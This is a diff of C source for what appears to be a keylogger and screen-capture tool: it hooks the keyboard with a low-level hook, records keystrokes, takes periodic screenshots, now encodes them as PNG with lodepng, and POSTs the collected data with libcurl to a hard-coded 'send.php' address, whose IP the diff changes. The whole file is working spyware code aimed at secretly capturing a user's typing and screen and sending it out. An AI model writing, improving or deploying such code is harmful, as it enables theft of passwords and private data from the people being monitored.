@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <time.h>
 #include "curl/curl.h"
+#include "lodepng.h"
 
 #define BUFFERLEN 1024
 char *buffer;
@@ -8,18 +9,8 @@ unsigned int bufferIndex = 0;
 unsigned int bufferSize = BUFFERLEN;
 HANDLE mutex;
 
-// Helper function to retrieve current position of file pointer:
-inline int GetFilePointer(HANDLE FileHandle){
-    return SetFilePointer(FileHandle, 0, 0, FILE_CURRENT);
-    }
-//---------------------------------------------------------------------------
-
-// Screenshot
-//    -> FileName: Name of file to save screenshot to
-//    -> lpDDS: DirectDraw surface to capture
-//    <- Result: Success
-//
-BOOL SaveBMPFile(char *filename, HBITMAP bitmap, HDC bitmapDC, int width, int height){
+BOOL SaveBMPFile(char *filename, HBITMAP bitmap, HDC bitmapDC, int width, int height)
+{
     BOOL Success=FALSE;
     HDC SurfDC=NULL;        // GDI-compatible device context for the surface
     HBITMAP OffscrBmp=NULL; // bitmap that is converted to a DIB
@@ -29,128 +20,53 @@ BOOL SaveBMPFile(char *filename, HBITMAP bitmap, HDC bitmapDC, int width, int he
     HANDLE BmpFile=INVALID_HANDLE_VALUE;    // destination .bmp file
     BITMAPFILEHEADER bmfh;  // .bmp file header
 
-    // We need an HBITMAP to convert it to a DIB:
     if ((OffscrBmp = CreateCompatibleBitmap(bitmapDC, width, height)) == NULL)
         return FALSE;
 
-    // The bitmap is empty, so let's copy the contents of the surface to it.
-    // For that we need to select it into a device context. We create one.
     if ((OffscrDC = CreateCompatibleDC(bitmapDC)) == NULL)
         return FALSE;
 
-    // Select OffscrBmp into OffscrDC:
     HBITMAP OldBmp = (HBITMAP)SelectObject(OffscrDC, OffscrBmp);
-
-    // Now we can copy the contents of the surface to the offscreen bitmap:
     BitBlt(OffscrDC, 0, 0, width, height, bitmapDC, 0, 0, SRCCOPY);
-
-    // GetDIBits requires format info about the bitmap. We can have GetDIBits
-    // fill a structure with that info if we pass a NULL pointer for lpvBits:
-    // Reserve memory for bitmap info (BITMAPINFOHEADER + largest possible
-    // palette):
-   // if ((lpbi = (LPBITMAPINFO)(new char[sizeof(BITMAPINFOHEADER) + 256 * sizeof(RGBQUAD)])) == NULL) 
-     //   return false;
-
 	lpbi = (LPBITMAPINFO)malloc(sizeof(BITMAPINFOHEADER) + 256 * sizeof(RGBQUAD));
 
     ZeroMemory(&lpbi->bmiHeader, sizeof(BITMAPINFOHEADER));
     lpbi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
-    // Get info but first de-select OffscrBmp because GetDIBits requires it:
+
     SelectObject(OffscrDC, OldBmp);
     if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, NULL, lpbi, DIB_RGB_COLORS))
         return FALSE;
 
-    // Reserve memory for bitmap bits:
+    lpvBits = malloc(lpbi->bmiHeader.biSizeImage);
 
-        
-        lpvBits = malloc(lpbi->bmiHeader.biSizeImage);
-
-    // Have GetDIBits convert OffscrBmp to a DIB (device-independent bitmap):
     if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, lpvBits, lpbi, DIB_RGB_COLORS))
         return FALSE;
 
-    // Create a file to save the DIB to:
-    if ((BmpFile = CreateFile(filename,
-                              GENERIC_WRITE,
-                              0, NULL,
-                              CREATE_ALWAYS,
-                              FILE_ATTRIBUTE_NORMAL,
-                              NULL)) == INVALID_HANDLE_VALUE)
-                              
-                              return FALSE;
+	int h = height;
+    int w = width;
+    unsigned scanlineBytes = w * 4;
+	if(scanlineBytes % 4 != 0) scanlineBytes = (scanlineBytes / 4) * 4 + 4;
 
-    DWORD Written;    // number of bytes written by WriteFile
-    
-    // Write a file header to the file:
-    bmfh.bfType = 19778;        // 'BM'
-    // bmfh.bfSize = ???        // we'll write that later
-    bmfh.bfReserved1 = bmfh.bfReserved2 = 0;
-    // bmfh.bfOffBits = ???     // we'll write that later
-    if (!WriteFile(BmpFile, &bmfh, sizeof(bmfh), &Written, NULL))
-        return FALSE;
+	char *png = malloc(w * h * 4);
+	int x,y;
+	
+	for(y = 0; y < h; y++)
+	for(x = 0; x < w; x++)
+	{
+    	unsigned bmpos = (h - y - 1) * scanlineBytes + 4 * x;
+    	unsigned newpos = 4 * y * w + 4 * x;
 
-    if (Written < sizeof(bmfh)) 
-        return FALSE; 
-
-    // Write BITMAPINFOHEADER to the file:
-    if (!WriteFile(BmpFile, &lpbi->bmiHeader, sizeof(BITMAPINFOHEADER), &Written, NULL)) 
-        return FALSE;
-    
-    if (Written < sizeof(BITMAPINFOHEADER)) 
-            return FALSE;
-
-    // Calculate size of palette:
-    int PalEntries;
-    // 16-bit or 32-bit bitmaps require bit masks:
-    if (lpbi->bmiHeader.biCompression == BI_BITFIELDS) 
-        PalEntries = 3;
-    else
-        // bitmap is palettized?
-        PalEntries = (lpbi->bmiHeader.biBitCount <= 8) ?
-            // 2^biBitCount palette entries max.:
-            (int)(1 << lpbi->bmiHeader.biBitCount)
-        // bitmap is TrueColor -> no palette:
-        : 0;
-    // If biClrUsed use only biClrUsed palette entries:
-    if(lpbi->bmiHeader.biClrUsed) 
-        PalEntries = lpbi->bmiHeader.biClrUsed;
-
-    // Write palette to the file:
-    if(PalEntries){
-        if (!WriteFile(BmpFile, &lpbi->bmiColors, PalEntries * sizeof(RGBQUAD), &Written, NULL)) 
-            return FALSE;
-
-        if (Written < PalEntries * sizeof(RGBQUAD)) 
-            return FALSE;
-        }
-
-    // The current position in the file (at the beginning of the bitmap bits)
-    // will be saved to the BITMAPFILEHEADER:
-    bmfh.bfOffBits = GetFilePointer(BmpFile);
-
-    // Write bitmap bits to the file:
-    if (!WriteFile(BmpFile, lpvBits, lpbi->bmiHeader.biSizeImage, &Written, NULL)) 
-        return FALSE;
-    
-    if (Written < lpbi->bmiHeader.biSizeImage) 
-        return FALSE;
-
-    // The current pos. in the file is the final file size and will be saved:
-    bmfh.bfSize = GetFilePointer(BmpFile);
-
-    // We have all the info for the file header. Save the updated version:
-    SetFilePointer(BmpFile, 0, 0, FILE_BEGIN);
-    if (!WriteFile(BmpFile, &bmfh, sizeof(bmfh), &Written, NULL))
-        return FALSE;
-
-    if (Written < sizeof(bmfh)) 
-        return FALSE;
-
+    	png[newpos + 0] = ((char *)lpvBits)[bmpos + 2]; //R
+		png[newpos + 1] = ((char *)lpvBits)[bmpos + 1]; //G
+		png[newpos + 2] = ((char *)lpvBits)[bmpos + 0]; //B
+		png[newpos + 3] = 255;            //A
+	}
+	  
+    lodepng_encode32_file(filename, png, width, height);
 	CloseHandle(BmpFile);
+	free(lpvBits);
     return TRUE;
-    }
-    
-
+}
 
 BOOL ScreenCapture(char *filename)
 {	
@@ -196,7 +112,7 @@ int CurlSend(char *data, int length, char *postParamName)
 		strcpy(sendStr, inputStr);
 		strcat(sendStr, httpStr);
 		
-		curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.43.175/send/send.php");
+		curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.1.100/send/send.php");
 		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, sendStr);
 		res = curl_easy_perform(curl);
 		curl_easy_cleanup(curl);
@@ -261,7 +177,7 @@ void SaveKey(unsigned int key)
 LRESULT CALLBACK RawInput(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	KBDLLHOOKSTRUCT *keyboard = (KBDLLHOOKSTRUCT *)lParam;
-	
+
 	if (wParam == WM_KEYDOWN)
 	{
 		SaveKey(keyboard->vkCode);
@@ -325,7 +241,7 @@ int main(void)
 	while(1)
 	{
 		if(timer > 10)
-		{
+		{	
 			SendScreenshot();
 			
 			// lock
